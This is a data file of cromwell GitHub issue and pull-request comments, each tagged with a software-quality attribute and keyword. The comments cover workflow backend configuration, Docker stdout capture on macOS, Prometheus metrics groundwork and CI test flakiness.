https://github.com/broadinstitute/cromwell/pull/6681#issuecomment-1049016142:661,Testability,test,test,661,"@jgainerdewar Your guess was correct--Prometheus/Stackdriver labels have no concept of order, so that information is lost when the InstrumentationPath is used to derive that sort of name. The StatsD form effectively looses the additional ""what's a high variant part and what isn't"" info while the Prometheus form looses the ordering of those parts. This is normal in Prometheus-land and all the query systems are built on that assumption. . There'll definitely be tests for the Prometheus code when it's added to clearly demonstrate that--this is sorta a weird one because I want to lay the groundwork without actually adding full Prometheus support yet. [This test](https://github.com/broadinstitute/cromwell/pull/6681/files#diff-65d7248a0c8799434124fe6d53023d0d8ac3492d640bbe4510801d2981e0903fR42) and a few others check that the groundwork is working, it's just a bit of a weird refactoring until the Prometheus code takes advantage of it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6681#issuecomment-1049016142
https://github.com/broadinstitute/cromwell/pull/6681#issuecomment-1049016142:513,Usability,clear,clearly,513,"@jgainerdewar Your guess was correct--Prometheus/Stackdriver labels have no concept of order, so that information is lost when the InstrumentationPath is used to derive that sort of name. The StatsD form effectively looses the additional ""what's a high variant part and what isn't"" info while the Prometheus form looses the ordering of those parts. This is normal in Prometheus-land and all the query systems are built on that assumption. . There'll definitely be tests for the Prometheus code when it's added to clearly demonstrate that--this is sorta a weird one because I want to lay the groundwork without actually adding full Prometheus support yet. [This test](https://github.com/broadinstitute/cromwell/pull/6681/files#diff-65d7248a0c8799434124fe6d53023d0d8ac3492d640bbe4510801d2981e0903fR42) and a few others check that the groundwork is working, it's just a bit of a weird refactoring until the Prometheus code takes advantage of it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6681#issuecomment-1049016142
https://github.com/broadinstitute/cromwell/pull/6683#issuecomment-1051019488:33,Availability,failure,failures,33,I agree that metrics on checksum failures would be nice but that does seem to be beyond the scope of the ticket as currently written; perhaps a follow-on ticket?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6683#issuecomment-1051019488
https://github.com/broadinstitute/cromwell/pull/6683#issuecomment-1051019488:24,Security,checksum,checksum,24,I agree that metrics on checksum failures would be nice but that does seem to be beyond the scope of the ticket as currently written; perhaps a follow-on ticket?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6683#issuecomment-1051019488
https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1046607100:5,Performance,cache,cache,5,"Call-cache cannot be used if a Singularity mirror is used. So Singularity becomes useless in the WDL process, where both call-cache and container are needed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1046607100
https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1046607100:126,Performance,cache,cache,126,"Call-cache cannot be used if a Singularity mirror is used. So Singularity becomes useless in the WDL process, where both call-cache and container are needed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1046607100
https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048:605,Availability,alive,alive,605,"I use this config in a SGE backend for singularity. ```; Singularity {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 100; exit-code-timeout-seconds = 120; runtime-attributes = """"""; String sif; Float? memory_gb; String? bind_path; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l mem_free="" + memory_gb + ""g""} \; singularity exec -e --bind ${cwd}:${cwd} \; ${""--bind "" + bind_path} \; ${sif} \; ${job_shell} ${script}; """""". job-id-regex = ""(\\d+)""; check-alive = ""qstat -j ${job_id}""; kill = ""qdel ${job_id}""; }; }; ```; Every task should have a `String sif`, point to the path to sif file. You can modify this according to your need.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048
https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048:11,Modifiability,config,config,11,"I use this config in a SGE backend for singularity. ```; Singularity {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 100; exit-code-timeout-seconds = 120; runtime-attributes = """"""; String sif; Float? memory_gb; String? bind_path; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l mem_free="" + memory_gb + ""g""} \; singularity exec -e --bind ${cwd}:${cwd} \; ${""--bind "" + bind_path} \; ${sif} \; ${job_shell} ${script}; """""". job-id-regex = ""(\\d+)""; check-alive = ""qstat -j ${job_id}""; kill = ""qdel ${job_id}""; }; }; ```; Every task should have a `String sif`, point to the path to sif file. You can modify this according to your need.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048
https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048:115,Modifiability,config,config,115,"I use this config in a SGE backend for singularity. ```; Singularity {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 100; exit-code-timeout-seconds = 120; runtime-attributes = """"""; String sif; Float? memory_gb; String? bind_path; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l mem_free="" + memory_gb + ""g""} \; singularity exec -e --bind ${cwd}:${cwd} \; ${""--bind "" + bind_path} \; ${sif} \; ${job_shell} ${script}; """""". job-id-regex = ""(\\d+)""; check-alive = ""qstat -j ${job_id}""; kill = ""qdel ${job_id}""; }; }; ```; Every task should have a `String sif`, point to the path to sif file. You can modify this according to your need.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048
https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048:122,Modifiability,Config,ConfigBackendLifecycleActorFactory,122,"I use this config in a SGE backend for singularity. ```; Singularity {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 100; exit-code-timeout-seconds = 120; runtime-attributes = """"""; String sif; Float? memory_gb; String? bind_path; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l mem_free="" + memory_gb + ""g""} \; singularity exec -e --bind ${cwd}:${cwd} \; ${""--bind "" + bind_path} \; ${sif} \; ${job_shell} ${script}; """""". job-id-regex = ""(\\d+)""; check-alive = ""qstat -j ${job_id}""; kill = ""qdel ${job_id}""; }; }; ```; Every task should have a `String sif`, point to the path to sif file. You can modify this according to your need.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048
https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048:159,Modifiability,config,config,159,"I use this config in a SGE backend for singularity. ```; Singularity {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 100; exit-code-timeout-seconds = 120; runtime-attributes = """"""; String sif; Float? memory_gb; String? bind_path; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l mem_free="" + memory_gb + ""g""} \; singularity exec -e --bind ${cwd}:${cwd} \; ${""--bind "" + bind_path} \; ${sif} \; ${job_shell} ${script}; """""". job-id-regex = ""(\\d+)""; check-alive = ""qstat -j ${job_id}""; kill = ""qdel ${job_id}""; }; }; ```; Every task should have a `String sif`, point to the path to sif file. You can modify this according to your need.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048
https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048:169,Performance,concurren,concurrent-job-limit,169,"I use this config in a SGE backend for singularity. ```; Singularity {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 100; exit-code-timeout-seconds = 120; runtime-attributes = """"""; String sif; Float? memory_gb; String? bind_path; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l mem_free="" + memory_gb + ""g""} \; singularity exec -e --bind ${cwd}:${cwd} \; ${""--bind "" + bind_path} \; ${sif} \; ${job_shell} ${script}; """""". job-id-regex = ""(\\d+)""; check-alive = ""qstat -j ${job_id}""; kill = ""qdel ${job_id}""; }; }; ```; Every task should have a `String sif`, point to the path to sif file. You can modify this according to your need.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048
https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048:207,Safety,timeout,timeout-seconds,207,"I use this config in a SGE backend for singularity. ```; Singularity {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 100; exit-code-timeout-seconds = 120; runtime-attributes = """"""; String sif; Float? memory_gb; String? bind_path; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l mem_free="" + memory_gb + ""g""} \; singularity exec -e --bind ${cwd}:${cwd} \; ${""--bind "" + bind_path} \; ${sif} \; ${job_shell} ${script}; """""". job-id-regex = ""(\\d+)""; check-alive = ""qstat -j ${job_id}""; kill = ""qdel ${job_id}""; }; }; ```; Every task should have a `String sif`, point to the path to sif file. You can modify this according to your need.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048
https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1055722482:221,Availability,echo,echo,221,I can't tell from this fragment what the problem you're seeing is. This workflow worked as expected for me. I tried running it using `miniwdl run` and `java -jar cromwell.jar run`.; ```; version 1.0. task T {; command {; echo hello world; >&2 echo another world; }; output {; File out = stdout(); File err = stderr(); }; }. workflow W {; call T; output {; File out = T.out; File err = T.err; }; }; ```; Another common form is `String s = read_string(stdout())` which puts the command block `stdout` in a string result. Sometimes this is easier to use than opening a file.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1055722482
https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1055722482:243,Availability,echo,echo,243,I can't tell from this fragment what the problem you're seeing is. This workflow worked as expected for me. I tried running it using `miniwdl run` and `java -jar cromwell.jar run`.; ```; version 1.0. task T {; command {; echo hello world; >&2 echo another world; }; output {; File out = stdout(); File err = stderr(); }; }. workflow W {; call T; output {; File out = T.out; File err = T.err; }; }; ```; Another common form is `String s = read_string(stdout())` which puts the command block `stdout` in a string result. Sometimes this is easier to use than opening a file.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1055722482
https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1056352489:235,Testability,test,tests,235,"Trying the example above worked, but it seems to be that cromwell fails to capture docker ran jobs? Here is a more detailed example: ; ```. version development. workflow wf {; input {; File left_ = ""/Users/leo/dev/tools/trinity/2.13.2/tests/data/reads.left.fa""; File right_ = ""/Users/leo/dev/tools/trinity/2.13.2/tests/data/reads.right.fa""; String seqType = ""fa""; }. call trinity {; input:; left_ = left_,; right_ = right_,; seqType_ = seqType,; }. output {; File output_fasta_ = trinity.output_fasta_; File out = trinity.out; File err = trinity.err; }; }. task trinity {; input {; File? left_; File? right_; File? sample_file_; String seqType_ ; String? memory_ = ""1""; Int? cpus_; String output_dir = 'trinity_out'; }. command <<<; set -e -o pipefail. Trinity \; ~{if defined(left_) then '--left ${left_}' else ''} \; ~{if defined(right_) then '--right ${right_}' else ''} \; ~{if defined(seqType_) then '--seqType ${seqType_}' else ''} \; ~{if defined(memory_) then '--max_memory ${memory_}G' else ''} \; ~{if defined(output_dir) then '--output ${output_dir}' else ''}; >>>. runtime {; docker: 'trinity@sha256:e6d449f0838b91beaa17c15cf4d391a79ff6069badf98e92b686062624946630'; docker_user: 'root'; memory: if defined(memory_) then ""${memory_}"" else """"; cpu: if defined(cpus_) then ""${cpus_}"" else """"; }. output {; File output_fasta_ = ""trinity_out.Trinity.fasta""; File out = stdout(); File err = stderr(); }; }; ```. ![image](https://user-images.githubusercontent.com/95832510/156307135-f6860a4d-3ac0-4990-9a99-2bdccd0984e3.png). When I go look at stderr and stdout, they are both empty and fail to capture stdout and stderr. Not sure what is going on here. . The only thing I can think of is cromwell cannot capture docker ran jobs stdout and stderr. Another idea is that the tool itself does not write to stdout or stderr but I confirmed that it does locally. . Docker image: `docker pull pegi3s/trinity`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1056352489
https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1056352489:313,Testability,test,tests,313,"Trying the example above worked, but it seems to be that cromwell fails to capture docker ran jobs? Here is a more detailed example: ; ```. version development. workflow wf {; input {; File left_ = ""/Users/leo/dev/tools/trinity/2.13.2/tests/data/reads.left.fa""; File right_ = ""/Users/leo/dev/tools/trinity/2.13.2/tests/data/reads.right.fa""; String seqType = ""fa""; }. call trinity {; input:; left_ = left_,; right_ = right_,; seqType_ = seqType,; }. output {; File output_fasta_ = trinity.output_fasta_; File out = trinity.out; File err = trinity.err; }; }. task trinity {; input {; File? left_; File? right_; File? sample_file_; String seqType_ ; String? memory_ = ""1""; Int? cpus_; String output_dir = 'trinity_out'; }. command <<<; set -e -o pipefail. Trinity \; ~{if defined(left_) then '--left ${left_}' else ''} \; ~{if defined(right_) then '--right ${right_}' else ''} \; ~{if defined(seqType_) then '--seqType ${seqType_}' else ''} \; ~{if defined(memory_) then '--max_memory ${memory_}G' else ''} \; ~{if defined(output_dir) then '--output ${output_dir}' else ''}; >>>. runtime {; docker: 'trinity@sha256:e6d449f0838b91beaa17c15cf4d391a79ff6069badf98e92b686062624946630'; docker_user: 'root'; memory: if defined(memory_) then ""${memory_}"" else """"; cpu: if defined(cpus_) then ""${cpus_}"" else """"; }. output {; File output_fasta_ = ""trinity_out.Trinity.fasta""; File out = stdout(); File err = stderr(); }; }; ```. ![image](https://user-images.githubusercontent.com/95832510/156307135-f6860a4d-3ac0-4990-9a99-2bdccd0984e3.png). When I go look at stderr and stdout, they are both empty and fail to capture stdout and stderr. Not sure what is going on here. . The only thing I can think of is cromwell cannot capture docker ran jobs stdout and stderr. Another idea is that the tool itself does not write to stdout or stderr but I confirmed that it does locally. . Docker image: `docker pull pegi3s/trinity`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1056352489
https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1064212178:142,Security,Integrity,Integrity,142,"If `/cromwell-executions/` is referring to the root of your Mac system, I would not expect that to work due to a Mac feature known as [System Integrity Protection](https://support.apple.com/en-us/HT204899). You can test this in isolation by issuing `sudo mkdir /test` which returns `mkdir: /test: Read-only file system` for me (Mac OS 12.2.1). I do not recommend using an escalation to `root` to work around, well, pretty much anything.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1064212178
https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1064212178:215,Testability,test,test,215,"If `/cromwell-executions/` is referring to the root of your Mac system, I would not expect that to work due to a Mac feature known as [System Integrity Protection](https://support.apple.com/en-us/HT204899). You can test this in isolation by issuing `sudo mkdir /test` which returns `mkdir: /test: Read-only file system` for me (Mac OS 12.2.1). I do not recommend using an escalation to `root` to work around, well, pretty much anything.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1064212178
https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1064212178:262,Testability,test,test,262,"If `/cromwell-executions/` is referring to the root of your Mac system, I would not expect that to work due to a Mac feature known as [System Integrity Protection](https://support.apple.com/en-us/HT204899). You can test this in isolation by issuing `sudo mkdir /test` which returns `mkdir: /test: Read-only file system` for me (Mac OS 12.2.1). I do not recommend using an escalation to `root` to work around, well, pretty much anything.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1064212178
https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1064212178:291,Testability,test,test,291,"If `/cromwell-executions/` is referring to the root of your Mac system, I would not expect that to work due to a Mac feature known as [System Integrity Protection](https://support.apple.com/en-us/HT204899). You can test this in isolation by issuing `sudo mkdir /test` which returns `mkdir: /test: Read-only file system` for me (Mac OS 12.2.1). I do not recommend using an escalation to `root` to work around, well, pretty much anything.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1064212178
https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1171538706:484,Security,Integrity,Integrity,484,"If you are a Mac user and are also experiencing this issue, you have to compile cromwell from source and change file `backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala` as so: ; ```; - |mkfifo ""$$$out"" ""$$$err""; - |trap 'rm ""$$$out"" ""$$$err""' EXIT; + |touch ""$$$out"" ""$$$err""; |touch $stdoutRedirection $stderrRedirection; - |tee $stdoutRedirection < ""$$$out"" &; - |tee $stderrRedirection < ""$$$err"" >&2 &; ```. This will allow you bypass the `System Integrity Protection` and produce stdout and stderr logs if running local.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1171538706
https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1171538706:536,Testability,log,logs,536,"If you are a Mac user and are also experiencing this issue, you have to compile cromwell from source and change file `backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala` as so: ; ```; - |mkfifo ""$$$out"" ""$$$err""; - |trap 'rm ""$$$out"" ""$$$err""' EXIT; + |touch ""$$$out"" ""$$$err""; |touch $stdoutRedirection $stderrRedirection; - |tee $stdoutRedirection < ""$$$out"" &; - |tee $stderrRedirection < ""$$$err"" >&2 &; ```. This will allow you bypass the `System Integrity Protection` and produce stdout and stderr logs if running local.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1171538706
https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1171664673:40,Usability,learn,learn,40,"Thanks for the followup, interesting to learn you found a workaround. I'd be curious to see whether there is a simpler workaround involving a change to the directory you run Cromwell from. When I run with local Docker, Cromwell puts `cromwell-executions` at the same path as the executable, i.e. if I run Cromwell from; ```; /Users/anichols/Projects/cromwell; ```; I get a files at paths like; ```; /Users/anichols/Projects/cromwell/cromwell-executions/three_step/ce6a6385-a8d6-4532-9aa4-d2eacdd89f5b/call-cgrep/execution/rc; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1171664673
https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1171664673:111,Usability,simpl,simpler,111,"Thanks for the followup, interesting to learn you found a workaround. I'd be curious to see whether there is a simpler workaround involving a change to the directory you run Cromwell from. When I run with local Docker, Cromwell puts `cromwell-executions` at the same path as the executable, i.e. if I run Cromwell from; ```; /Users/anichols/Projects/cromwell; ```; I get a files at paths like; ```; /Users/anichols/Projects/cromwell/cromwell-executions/three_step/ce6a6385-a8d6-4532-9aa4-d2eacdd89f5b/call-cgrep/execution/rc; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1171664673
https://github.com/broadinstitute/cromwell/pull/6689#issuecomment-1048227851:9,Availability,failure,failures,9,Ignoring failures of `should successfully run drs_usa_hca`:; * https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/560770806; * https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/560770807; * https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/560770814; * https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/560770815. because it is currently a known failure (due to the test data being deleted) and because this is an urgent fix.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6689#issuecomment-1048227851
https://github.com/broadinstitute/cromwell/pull/6689#issuecomment-1048227851:393,Availability,failure,failure,393,Ignoring failures of `should successfully run drs_usa_hca`:; * https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/560770806; * https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/560770807; * https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/560770814; * https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/560770815. because it is currently a known failure (due to the test data being deleted) and because this is an urgent fix.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6689#issuecomment-1048227851
https://github.com/broadinstitute/cromwell/pull/6689#issuecomment-1048227851:413,Testability,test,test,413,Ignoring failures of `should successfully run drs_usa_hca`:; * https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/560770806; * https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/560770807; * https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/560770814; * https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/560770815. because it is currently a known failure (due to the test data being deleted) and because this is an urgent fix.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6689#issuecomment-1048227851
https://github.com/broadinstitute/cromwell/pull/6698#issuecomment-1061127845:399,Modifiability,config,configure,399,"Now that I've read this more closely, I think it would be more appropriate to put this in its own tutorial doc file, rather than in the HPCIntro tutorial. Can you create a dedicated file in `docs/tutorials` for these instructions, called `HPCSlurmWithLocalScratch.md`? If you think this is a common use case for HPC users, you can link to the new file at the end of `HPCIntro`. . > If you'd like to configure Cromwell to use a local scratch device, [see instructions here](HPCSlurmWithLocalScratch.md).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6698#issuecomment-1061127845
https://github.com/broadinstitute/cromwell/pull/6706#issuecomment-1064607797:151,Integrability,message,messages,151,"@salonishah11 with a goal of getting this code back in `develop`, I'm gonna let CI run a couple times and check logs for `Cromwell failed to progress` messages. It has been a mystery exactly what the problem is.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6706#issuecomment-1064607797
https://github.com/broadinstitute/cromwell/pull/6706#issuecomment-1064607797:112,Testability,log,logs,112,"@salonishah11 with a goal of getting this code back in `develop`, I'm gonna let CI run a couple times and check logs for `Cromwell failed to progress` messages. It has been a mystery exactly what the problem is.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6706#issuecomment-1064607797
https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1067386292:46,Availability,error,error,46,"It seems like the root cause of the bug is an error by the [story](https://broadworkbench.atlassian.net/browse/BW-568) author 😄 . > Behavior is undefined when groups are tied, whatever happens by default is fine",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1067386292
https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068003722:65,Availability,error,error,65,"Re @aednichols :. >It seems like the root cause of the bug is an error by the [story](https://broadworkbench.atlassian.net/browse/BW-568) author 😄; >; > Behavior is undefined when groups are tied, whatever happens by default is fine. Are there any metrics we can add to look out in advance for disadvantaged users?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068003722
https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068427838:669,Safety,timeout,timeout,669,"> Is it right that like the test didn't like the fact that workflows stayed in the store for too long, even if they all eventually ran? So the submission time sort makes sure that workflows run closer to the order in which they are submitted. @aednichols yes that is correct. So previously, we used to sort by hog group name if there was a tie for lowest workflow running count, and because of this hog groups which started with higher alphabets (c, d, e, f) in Centaur tests were at disadvantage (because hog group names would be first 8 characters of workflow ID) and workflow IDs starting with numbers or lower alphabets would always be picked up causing Centaur to timeout. This should now not happen as we would sort by submission time when there is a tie. >Are there any metrics we can add to look out in advance for disadvantaged users?. @cjllanwarne A separate ticket was created for metrics - [BW-1121](https://broadworkbench.atlassian.net/browse/BW-1121).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068427838
https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068427838:28,Testability,test,test,28,"> Is it right that like the test didn't like the fact that workflows stayed in the store for too long, even if they all eventually ran? So the submission time sort makes sure that workflows run closer to the order in which they are submitted. @aednichols yes that is correct. So previously, we used to sort by hog group name if there was a tie for lowest workflow running count, and because of this hog groups which started with higher alphabets (c, d, e, f) in Centaur tests were at disadvantage (because hog group names would be first 8 characters of workflow ID) and workflow IDs starting with numbers or lower alphabets would always be picked up causing Centaur to timeout. This should now not happen as we would sort by submission time when there is a tie. >Are there any metrics we can add to look out in advance for disadvantaged users?. @cjllanwarne A separate ticket was created for metrics - [BW-1121](https://broadworkbench.atlassian.net/browse/BW-1121).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068427838
https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068427838:470,Testability,test,tests,470,"> Is it right that like the test didn't like the fact that workflows stayed in the store for too long, even if they all eventually ran? So the submission time sort makes sure that workflows run closer to the order in which they are submitted. @aednichols yes that is correct. So previously, we used to sort by hog group name if there was a tie for lowest workflow running count, and because of this hog groups which started with higher alphabets (c, d, e, f) in Centaur tests were at disadvantage (because hog group names would be first 8 characters of workflow ID) and workflow IDs starting with numbers or lower alphabets would always be picked up causing Centaur to timeout. This should now not happen as we would sort by submission time when there is a tie. >Are there any metrics we can add to look out in advance for disadvantaged users?. @cjllanwarne A separate ticket was created for metrics - [BW-1121](https://broadworkbench.atlassian.net/browse/BW-1121).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068427838
https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068440709:170,Testability,test,test,170,"> Are there any metrics we can add to look out in advance for disadvantaged users?. @cjllanwarne my comment was a bit terse but it refers to the old code that was having test issues, this current PR will not have disadvantaged users.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068440709
https://github.com/broadinstitute/cromwell/pull/6714#issuecomment-1071072611:102,Availability,downtime,downtime,102,The most recent PR build succeeded but GitHub apparently did not take note of that during its earlier downtime.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6714#issuecomment-1071072611
https://github.com/broadinstitute/cromwell/pull/6719#issuecomment-1077489235:52,Testability,test,test,52,"No worries, the sheer number of Scala Steward PRs + test flakiness seems to inevitably cause a few things to slip through.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6719#issuecomment-1077489235
